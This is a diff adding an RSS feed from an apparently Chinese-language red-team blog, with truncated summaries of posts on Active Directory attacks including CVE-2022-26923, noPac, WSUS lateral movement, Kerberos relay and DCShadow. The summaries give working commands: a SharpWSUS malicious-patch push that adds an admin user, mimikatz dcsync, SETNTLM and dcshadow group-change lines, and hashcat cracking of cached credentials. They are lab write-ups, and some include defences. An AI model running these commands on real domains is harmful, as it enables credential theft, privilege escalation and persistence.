@@ -1,0 +1,230 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>AD on lzzzzzzz</title>
+    <link>https://lzzbb.github.io/tags/ad/</link>
+    <description>Recent content in AD on lzzzzzzz</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
+    <lastBuildDate>Fri, 13 May 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://lzzbb.github.io/tags/ad/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>CVE-2022-26923（ADCS）</title>
+      <link>https://lzzbb.github.io/posts/2022/05/cve-2022-26923adcs/</link>
+      <pubDate>Fri, 13 May 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://lzzbb.github.io/posts/2022/05/cve-2022-26923adcs/</guid>
+      <description>漏洞披露 前置知识： 1.adcs可为域用户和机器账户申请证书
+2.PKINIT 为 Kerberos 的扩展协议，可通过 X.509 证书用来获取 Kerberos 票据。总而言之可以将申请的证书转化为对应的TGT。（域用户转为域用户的TGT，机器账户转为机器账户的TGT）
+3.PKCA扩展协议认证的时候，返回的PAC中包含了NTLM票据。（可以从用户证书中提取ntlm hash）
+证书服务安装： https://www.anquanke.com/post/id/245791
+漏洞概述 该漏洞与去年年底的nopac通过修改sAMAccountName来达到欺骗KDC类似；这个漏洞的利用是通过修改机器账户的dNSHostName属性，从而生成域内任意机器账户的证书进行利用。
+可结合以前的nopac分析文章看，原理类似：https://www.anquanke.com/post/id/264500
+定位ADCS服务器 1.域内利用certutil
+certutil -config - -ping
+2.LDAP中查找
+CN=Certification Authorities,CN=Public Key Services,CN=Services,CN=Configuration,DC=redteam,DC=lab
+用户申请证书 UPN（userPrincipalName）是基于Internet标准RFC 822的用户样式登录名，UPN是可选并在域林中的安全主体对象名中保持唯一。在创建用户时可以指定也可不单独指定，用户格式为：username@domain.name。
+域名：redteam.lab SamAccountName：marry NetBIOS登录名：reedteam\marry UserPrincipalName：marry@redteam.lab 用户申请证书时，ADCS Server将申请证书用户的UPN属性值添加到颁发证书的备用名称中，使用证书时将 UPN 从证书映射到目标用户进行识别，因为UPN是可选并在域林中的安全主体对象名中保持唯一，所以通过修改成与任意DC相同的UPN属性不会成立。
+机器账户申请证书 机器账户申请证书时，CA 将从 Active Directory 中请求者用户对象的dNSHostName属性获得的值添加到已颁发证书的主题备用名称中进行识别，dNSHostName属性在AD中不要求唯一，所以可以通过修改成与任意DC相同的dNSHostName来达到欺骗ADCS的效果，实现域内提权。
+漏洞利用需要修改机器账户dNSHostName字段，但如https://www.netspi.com/blog/technical/network-penetration-testing/machineaccountquota-is-useful-sometimes/所说：
+ 修改 samAccountName、DnsHostname 或 msDS-AdditionalDnsHostName 属性时SPN 列表会自动更新。
+ 添加机器帐户默认会创建4个SPN,包括以下内容：
+1. HOST/MachineAccountName 2. HOST/MachineAccountName.domain.name 3. RestrictedKrbHost/MachineAccountName 4. RestrictedKrbhost/MachineAccountName.domain.name 意味着将要利用的机器账户改成和DC相同的SPN，但是SPN是网络控制器服务实例的唯一标识符，Kerberos身份验证使用它来将服务实例与服务登录帐户相关联，这时会产生冲突；但如果servicePrincipalName属性中HOST/MachineAccountName.domain.name和RestrictedKrbhost/MachineAccountName.domain.name在设置以上属性之前已被删除，那么SPN列表将不会更新，除非再次给该字段赋值。
+漏洞利用 实验环境 域名：redteam.lab 1.ADCS服务器：AdcsMachine@192.168.129.151 2.域内域控Server2016：DC1@192.168.129.130 2.</description>
+    </item>
+    
+    <item>
+      <title>WSUS利用</title>
+      <link>https://lzzbb.github.io/posts/2022/05/wsus%E5%88%A9%E7%94%A8/</link>
+      <pubDate>Wed, 11 May 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://lzzbb.github.io/posts/2022/05/wsus%E5%88%A9%E7%94%A8/</guid>
+      <description>WSUS简介 WSUS是微软在其网络结构中提供的关于系统补丁更新的一个解决方案，在一些规模较大的域可能会出现。
+WSUS可以在域内机器不出网的时候，将客户端绑定到WSUS Server上，将一些补丁或者组件更新时直接放到WSUS Server，通过 HTTP （8530端口）和 HTTPS （8531端口）与 Microsoft 通信来加载补丁，然后推到指定的域机器上，方便运维进行管理。
+最常见的情况是单域采用一台WSUS更新服务器进行管理，下图是域内单台(左)和多台WSUS右的架构图：
+利用 通过SharpWSUS枚举WSUS信息、推送恶意补丁到目标机器进行横向渗透。
+实验环境： 域名：redteam.lab 1.域内WSUS服务器server2019（机器名：WSUS-1） 2.域内域控Server2016（机器名：DC2） 2.域内机器win7（机器名：dm2007） 当前环境是拿到了域内win7的权限，然后通过WSUS Server进行横向渗透。
+定位当前主机WSUS Server 1.通过注册表
+HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
+2.通过SharpWSUS
+SharpWSUS.exe locate
+由上面的信息收集，可以得到WSUS Server机器名为WSUS-1，然后我们想方设法获得了WSUS-1的机器权限。
+ 通过WSUS-1枚举WSUS服务的详细信息：
+其中包括当前管理的计算机列表、ip、版本信息、上一次更新的时间。
+SharpWSUS.exe inspect
+可以看到域控（DC2）也在这台WSUS Server 更新的目标内，可以向它推送恶意更新，例如：添加本地管理员用户。
+要点 1.WSUS横向最不确定的因素是无法控制客户端何时向WSUS Server拉取补丁信息，这个属性通常在域内搭建WSUS的组策略中设置。利用成功与否决定于客户端安装了攻击者提供的恶意补丁。
+2.WSUS的有效负载必须是Microsoft 签名的二进制文件，并且必须指向磁盘上的某个位置，使 WSUS Server指向该二进制文件。由于需要签名的二进制文件，可以用PsExec.exe 以 SYSTEM 身份执行、RunDLL32在网络共享上运行恶意 DLL等方法进行横向，下面以psexec举例。
+横向 1.生成一个用psexec执行添加本地管理员组的恶意补丁，其中updateid是补丁的更新id。
+SharpWSUS.exe create /payload:&amp;quot;C:\Users\public\psexec.exe&amp;quot; /args:&amp;quot;-accepteula -s -d cmd.exe /c &#39;net user lzz Qq123456.. /add &amp;amp;&amp;amp; net localgroup administrators lzz /add&#39;&amp;quot; /title:&amp;quot;demo01&amp;quot;</description>
+    </item>
+    
+    <item>
+      <title>通过DNS进行Kerberos Relay</title>
+      <link>https://lzzbb.github.io/posts/2022/02/%E9%80%9A%E8%BF%87dns%E8%BF%9B%E8%A1%8Ckerberos-relay/</link>
+      <pubDate>Fri, 25 Feb 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://lzzbb.github.io/posts/2022/02/%E9%80%9A%E8%BF%87dns%E8%BF%9B%E8%A1%8Ckerberos-relay/</guid>
+      <description>当时成功后没截图，环境又出问题不想搭了，下面有些截图出处作者，旨在阐明自己的观点和理解
+利用条件 一台Linux，同C段有一台域机器，能访问ADCS Web注册页面
+漏洞存因 1.自 Windows Vista 以来的所有 Windows 都默认启用了IPV6，并且优先级比IPV4更高，每台机器都会定期请求DNS配置。
+如果攻击者获取了一台linux权限，并在广播域内存在另外一台域机器，可以利用mitm6对其进行DNS欺骗，让域机器认定linux是自己的权威域名服务器。
+2.AD中的 DNS 支持使用 Kerberos 在 DNS 上进行身份验证，用于此使具有动态地址的网络客户端的 DNS 记录与其当前 IP 地址保持同步：
+1. 域内机器查询DNS中的SOA记录。 2. 域内DNS通常绑定在域控上，对查询进行回应。 3. 域机器请求对A记录进行动态更新。 4. 因为没有提供身份验证，DNS拒绝动态更新。 5. 客户端使用TKEY查询来协商经过身份验证的查询的密钥。 6. 服务器回答TKEY资源记录，完成身份验证。 7. 客户端再次发送动态更新，但现在伴随着一条TSIG记录，该记录是使用在步骤5和6中建立的密钥的签名。 8. 服务器更新其DNS记录。 第 5 步和第 6 步，包含 Kerberos 身份验证过程：
+wireshark中提供直接将keytab 导入Kerberos，能将加密字段进行解密。
+利用上述流程，mitm6 可以将自己宣传为 DNS 服务器，所以受害者将发送SOA到攻击者指定的假服务器，如果攻击者拒绝他们的动态更新，再使用 Kerberos 进行身份验证。
+3.许多服务类实际上会隐式映射到 HOST 类（包括 DNS），因此当受害者请求 DNS 服务的票证时，实际上适用于具有 HOST SPN 的任何帐户。这是默认在域中的所有计算机帐户上设置的，因此可以针对在这些帐户下运行的任何服务。
+4.在去年的关于ADCS利用的白皮书中，ESC8的利用涉及 NTLM 中继到证书服务的 HTTP 接口部分来颁发证书。该接口接受 NTLM 身份验证并没有强制验证签名， 因此可以将接收到的Kerberos 身份验证转发到 ADCS web页面来申请用户证书。</description>
+    </item>
+    
+    <item>
+      <title>userAccountControl设置为8192作为后门</title>
+      <link>https://lzzbb.github.io/posts/2022/01/useraccountcontrol%E8%AE%BE%E7%BD%AE%E4%B8%BA8192%E4%BD%9C%E4%B8%BA%E5%90%8E%E9%97%A8/</link>
+      <pubDate>Wed, 12 Jan 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://lzzbb.github.io/posts/2022/01/useraccountcontrol%E8%AE%BE%E7%BD%AE%E4%B8%BA8192%E4%BD%9C%E4%B8%BA%E5%90%8E%E9%97%A8/</guid>
+      <description>在twitter上看到有人称更改userAccountControl能达到域内提权的效果，实质有很大限制，可以当做一个后门，但是特征也相当明显 0.o！
+来源推特： userAccountControl属性含义 creatorsid可以修改机器的userAccountControl但是不能改为8192
+并且修改userAccountControl后primaryGroupId也会随之改变
+515 – Domain Computers 516 – Domain Controllers (writable) 521 – Domain Controllers (Read-Only) 即userAccountControl更改之后groupid从515变为516
+查看域内域控也会显示</description>
+    </item>
+    
+    <item>
+      <title>Name impersonation and KDC bamboozling 分析</title>
+      <link>https://lzzbb.github.io/posts/2021/12/name-impersonation-and-kdc-bamboozling-%E5%88%86%E6%9E%90/</link>
+      <pubDate>Thu, 30 Dec 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://lzzbb.github.io/posts/2021/12/name-impersonation-and-kdc-bamboozling-%E5%88%86%E6%9E%90/</guid>
+      <description>文章首发于安全客：https://www.anquanke.com/post/id/264500
+0x00 漏洞背景 今年十一月Cliff Fisher 在推特披露了CVE-2021-42278和CVE-2021-42287两个关于AD域漏洞相关信息，该漏洞影响巨大，在默认情况下只需一个域用户即可拿到域内最高权限。
+0x01 披露时间线 11月10日Cliff Fisher在推特发布了相关的漏洞信息。
+12月10日Charlie Clark在博客发布漏洞原理及利用手段。
+12月11日cube0x0在github发布了noPac，实现了真正的武器化。
+0x02 漏洞概述 漏洞的产生本质是windows机器账户和kerbeors之间协调沟通所产生的逻辑问题。
+CVE-2021-42278 - KB5008102  允许攻击者任意修改计算机帐户sAMAccountName字段，进而模拟域控申请票据。
+ 加入域的机器账户默认由$结尾，samAccountName默认和域机器名一致。但DC没有对sAMAccountName属性进行合法性判断，导致删除sAMAccountName结尾的$照样可以以机器用户身份申请TGT票据。
+什么是sAMAccountName
+sAMAccountName 属性是一个登录名，用于支持以前版本的 Windows 中的客户端和服务器，例如 Windows NT 4.0、Windows 95、Windows 98 和 LAN Manager。 登录名必须少于 20 个字符，在域中的所有安全主体对象中必须唯一，并且不能包含以下任何字符：
+ &amp;ldquo;/ \ [ ] : ; | = , + * ? &amp;lt; &amp;gt;
+ userPrincipalName是基于Internet标准RFC 822的用户样式登录名，UPN是可选并在域林中的安全主体对象名中保持唯一。在创建用户时可以指定也可不单独指定，用户格式为：username@domain.name。
+域名：redteam.lab SamAccountName：marry NetBIOS登录名：reedteam\marry UserPrincipalName：marry@redteam.lab 在 Active Directory中，存储帐户登录名或用户对象实际上是命名符号“Domain\LogonName ”中使用NetBIOS名称组合，该属性是域用户对象的必需属性；而SAMAccountName应始终与UPN主体名称保持一致，即SAMAccountName必须等于属性“UserPrincipalName” 的前缀部分。
+更改sAMAccountName
+漏洞凭借修改计算机帐户sAMAccountName字段来模拟域控申请票据，但直接将域内机器Evilsystem的sAMAccountName改为与域控相同(不加$)，结果显示异常。
+原因如https://www.netspi.com/blog/technical/network-penetration-testing/machineaccountquota-is-useful-sometimes/所说：
+ 修改 samAccountName、DnsHostname 或 msDS-AdditionalDnsHostName 属性时SPN 列表会自动更新。</description>
+    </item>
+    
+    <item>
+      <title>利用MS-SAMR协议修改用户密码</title>
+      <link>https://lzzbb.github.io/posts/2021/11/%E5%88%A9%E7%94%A8ms-samr%E5%8D%8F%E8%AE%AE%E4%BF%AE%E6%94%B9%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81/</link>
+      <pubDate>Sat, 27 Nov 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://lzzbb.github.io/posts/2021/11/%E5%88%A9%E7%94%A8ms-samr%E5%8D%8F%E8%AE%AE%E4%BF%AE%E6%94%B9%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81/</guid>
+      <description>利用场景 1.拿下域控后定位到定位用户或者靶标，需要密码进行登录。 2.拿到某用户hash后，同样想通过该用户账户登录某系统，但目标系统不支持pth或者当前用户权限不支持pth。 虽然拿到了修改/重置密码的权限，但又不想直接修改目标用户的密码，因为这样用户在登录时就会发现自己的密码被修改了，此时有两种情况：
+1.如果有重置密码权限就可以使用SetNTLM来将用户密码重置 2.如果有hash的话可以使用ChangeNTLM修改 登录目标系统后，再将目标密码还原,默认情况下creatorsid用户有以上权限。
+SetNTLM 将域用户的密码或hash重置为新的密码或hash
+利用条件 当前身份对要修改的用户有Reset Password权限（默认域管具有此权限）
+假设此时拿到域控，想修改域内用户marry的密码来登录某系统，先Dcsync看用户当前的hash
+lsadump::dcsync /domain:redteam.lab /user:marry1 /csv
+重置用户密码为123456 lsadump::SETNTLM /server:192.168.129.130 /user:marry1 /password:1qaz@WSX
+登陆后再恢复密码 lsadump::SETNTLM /server:192.168.129.130 /user:marry1 /ntlm:5e95607216d9a4b7654d831beb9ee95c
+ChangeNTLM 依靠用户hash修改其密码
+利用条件 需要对目标用户有Change Password权限
+该权限一般是veryone拥有的，所以基本上拿到目标用户的hash/密码后都可以进行密码更改
+ChangeNTLM受到组策略影响，如果域内密码策略进行了限制，比如设置了密码最短使用期限为1天，这样每天只能修改一次密码。并且如果测试设置了强制密码历史规则时，则在更改次数内不能将密码修改为原密码。
+先关闭域内密码策略
+查询指定用户marry的NTLM Hash
+lsadump::dcsync /domain:redteam.lab /user:marry1 /csv
+重置用户密码为1qaz@WSX lsadump::changentlm /server:192.168.129.130 /user:marry2 /old:5e95607216d9a4b7654d831beb9ee95c /newpassword:1qaz@WSX
+登陆后再恢复密码hash lsadump::changentlm /server:192.168.129.130 /user:marry2 /oldpassword:1qaz@WSX /new:5e95607216d9a4b7654d831beb9ee95c
+如果恢复开始限制的组策略 lsadump::dcsync /domain:redteam.lab /user:jack /csv lsadump::changentlm /server:192.168.129.130 /user:jack /old:100171788f70402eb8cfddf3ea1189d0 /newpassword:123qwe. lsadump::changentlm /server:192.168.129.130 /user:jack /oldpassword:123qwe. /new:100171788f70402eb8cfddf3ea1189d0 会显示 ERROR kuhl_m_lsadump_changentlm_callback ; Bad new NTLM hash or password!</description>
+    </item>
+    
+    <item>
+      <title>laps</title>
+      <link>https://lzzbb.github.io/posts/2021/11/laps/</link>
+      <pubDate>Fri, 12 Nov 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://lzzbb.github.io/posts/2021/11/laps/</guid>
+      <description>防止PTH攻击 域机器的本地管理员很少被使用，但是给网路安全却带来了很大的风险。攻击者如果获取了本地管理员的NTLM，不需要破解，就可以尝试通过PTH攻击域内其他主机。为了解决这个问题，微软在2014年发布了KB2871997和KB2928120两个补丁，普通本地管理员(SID不等于500)PTH方式失效。
+本地管理员密码解决方案 (LAPS) 为在域中的每台计算机上使用具有相同密码的公共本地帐户的问题提供了解决方案。LAPS 通过为域中每台计算机上的公共本地管理员帐户设置不同的随机密码来解决此问题。使用该解决方案的域管理员可以确定哪些用户有权读取密码。
+LAPS要点 通过组策略开启部署LAPS后可以导出保存laps组策略报告浏览相关信息
+在LDAP中也体现了ms-mcs-AdmPwdExpirationTime和ms-mcs-AdmPwd字段
+其中ms-mcs-AdmPwdExpirationTime只要是经过了域身份验证都可以进行枚举；ms-mcs-AdmPwd只能由域管理员查看。
+防御措施 1. 尽管LAPS有效防御了PTH攻击，但由于ms-mcs-AdmPwd字段在LDAP中是以明文存储的，在攻击者拿到整个域权限后可以枚举所有的密码，所以LAP也需要在一个短的周期内更改密码。 2. 对域内进行加固。 AD CHECK 可以检查 CN=ms-Mcs-AdmPwd,CN=Schema,CN=Configuration,DC=redteam,DC=local是否存在CN=ms-Mcs-AdmPwd字段来判断是否部署LAPS。</description>
+    </item>
+    
+    <item>
+      <title>MSCASH</title>
+      <link>https://lzzbb.github.io/posts/2021/09/mscash/</link>
+      <pubDate>Sat, 18 Sep 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://lzzbb.github.io/posts/2021/09/mscash/</guid>
+      <description>MSCACHE的原理 Macash（又叫domain cached credentials、DCC、域缓存凭据）在PC连接域控失败的时候（比如员工晚上将电脑带回家）会自动使用缓存凭据来进行登录，这相当于是除了SAM、NDTS，以外的第三个数据库。
+mscash hash 不是NTLM hash，无法用于PTH。
+系统默认保存 10 个凭据（可以更改），当被保存的凭据已经超过 10 个的话，新的凭据会覆盖掉老的凭据；凭据被缓存在注册表里。
+MSCASH的保存位置默认只有 SYSTEM 权限可读，位于HKEY_LOCAL_MACHINE\SECURITY\Cache（本地账户没有这个注册表项）
+使用本地用户打开这个注册表项都为空
+利用mimikatz离线破解 token::elevate #假冒令牌提升至system权限 lsadump::cache 下图是在一台域机器上用本地管理员用户进行登录，抓取到了域内administrator和marry的cache
+而不在域内机器是不能进行读取的
+以administrator为例：
+使用hashcat来进行离线破解,真正密码为Qq123456..
+‘$DCC2$10240#administrator#b25ba143ea4a2b1617f1d1db7a41f589’ hashcat -m2100 &amp;#39;$DCC2$10240#administrator#b25ba143ea4a2b1617f1d1db7a41f589&amp;#39; top10000.txt --force --potfile-disable 破解了域管administrator的明文密码，所以如果在横向没有头绪的时候，不要忘记了这个方法，可能会有意想不到的收获。
+禁用凭证缓存 在组策略中设置禁用缓存
+计算机配置—windows设置—安全设置—本地策略—安全选项 交互式登录：之前登录到缓存的次数（域控制器不可用时） 默认是10，设置为0</description>
+    </item>
+    
+    <item>
+      <title>DCShadow</title>
+      <link>https://lzzbb.github.io/posts/2021/08/dcshadow/</link>
+      <pubDate>Sat, 14 Aug 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://lzzbb.github.io/posts/2021/08/dcshadow/</guid>
+      <description>DCShadow简介 DCShadow是指攻击者获取到域控管理员权限后，将攻陷的主机伪装成为DC(域控制器)，在伪装的DC上修改数据，然后触发域数据同步，使得指定的新对象或修改后的属性能够同步进入其他的DC中，从而达到权限维持的目的。
+nTDSDSA对象 在Windows域环境中，域控制器与普通主机的区别体现在活动目录数据库中，在活动目录数据库中通过一些特殊对象以及一定的数据对象层级关系来标识某台机器是域控制器。其中最关键的是nTDSDSA对象，该对象正是标识一台主机是域控角色的特殊对象，其位于活动目录数据库的configuration NC中
+伪装域控 在Windows域环境中，域控和普通主机的区别体现在活动目录数据库中。AD数据库中使用nTDSDSA对象来表示域控制器，该对象始终位于活动目录数据库的配置（configuration NC）中，每个DC都存储在站点容器内,是server对象的子节点，其完整的DN为“CN=NTDS Settings,CN=ServerName,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=redteam,DC=lab”。因此，只要在schema的Configuration区中创建一个新的server及nTDSDSA对象，KCC就会将目标主机识别为DC。
+通过DCShadow修改任意用户属性 通过查看权限后发现，SYSTEM、Domain Admins、Enterprise Admins、Administrators 可以在Configuration区中创建nTDSDSA对象。
+获得当前机器的SYSTEM权限（这个令牌就具备了伪造域控的所需权限）
+执行数据更改与监听
+lsadump::dcshadow /object:marry /attribute:description /value:”carn” /object：更改信息的账号 /attribute：要更改的属性 /value：更改属性的值 以域管权限新打开一个mimikatz窗口（可以psexec远程调用），执行push，触发域控间数据同步过程
+mimikatz # lsadump::dcshadow /push
+marry的属性发生改变
+既然活动目录能通过DCShadow进行修改，在实际攻击场景中，可以修改primarygroupid，SidHistory，委派等属性进行利用。
+变更用户的所属组 lsadump::dcshadow /object:marry /attribute:primarygroupid /value:512
+其中：512为Domain Admins所属组，在根域中，519为Enterprise Admins所属组（子域中没有EA组）
+marry变为Domain Admins组内用户
+可以通过4929事件记录所有详细的目录服务复制
+前提需要开启本地安全策略中的审核目录服务访问（默认是关闭状态）
+防御 DCShadow不是漏洞而是滥用了目录中的同步服务。
+1.记录目录服务访问事件（EventID=4929)，监控所有发生4929事件来识别伪装的域控。
+2.增强对域管的管理，防止其凭证泄漏。</description>
+    </item>
+    
+    <item>
+      <title>委派利用面</title>
+      <link>https://lzzbb.github.io/posts/2021/04/%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8%E9%9D%A2/</link>
+      <pubDate>Fri, 23 Apr 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://lzzbb.github.io/posts/2021/04/%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8%E9%9D%A2/</guid>
+      <description>委派概述： 域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动。
+简言之：当A访问服务B时，服务B拿着A用户的凭证去访问服务C，这个过程称为委派。
+委派的方式： 非约束委派和约束委派，基于资源的约束委派。
+在域内只有主机账号和服务账号才有委派属性
+主机账号：活动目录中的computers组内的计算机，也被称为机器账号。
+服务账号：域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来加入域内，比如：SQLServer,MYSQL等；域用户通过注册SPN也能成为服务账号。
+委派的前提： 被委派的用户不能被设置为不能被委派属性。
+查找非约束委派的主机或服务账号（域控默认配置非约束委派属性）： 1.利用powersploit中的powerview Import-Module .\PowerView.ps1;
+查询非约束委派的主机 Get-NetComputer -Unconstrained -Domain hiro.com
+查询非约束委派的服务账号 Get-NetUser -Unconstrained -Domain hiro.com | select name
+2.利用ADFind 查找域中配置非约束委派的用户 AdFind.exe -b &amp;ldquo;DC=hiro,DC=com&amp;rdquo; -f &amp;ldquo;(&amp;amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&amp;rdquo; cn distinguishedName
+查找域中配置非约束委派的主机 AdFind.exe -b &amp;ldquo;DC=hiro,DC=com&amp;rdquo; -f &amp;ldquo;(&amp;amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&amp;rdquo; cn distinguishedName
+查找约束委派的主机或服务账号： 1.利用empire中的powerview Import-Module .\powerview.ps1;
+查询约束委派的主机： Get-DomainComputer -TrustedToAuth -Domain hiro.com | select name
+查询约束委派的账号： Get-DomainUser -TrustedToAuth -Domain hiro.com | select name
+2.利用ADFind 查找域中配置约束委派用户: AdFind.exe -b &amp;ldquo;DC=hiro,DC=com&amp;rdquo; -f &amp;ldquo;(&amp;amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&amp;rdquo; cn distinguishedName msds-allowedtodelegateto</description>
+    </item>
+    
+  </channel>
+</rss>
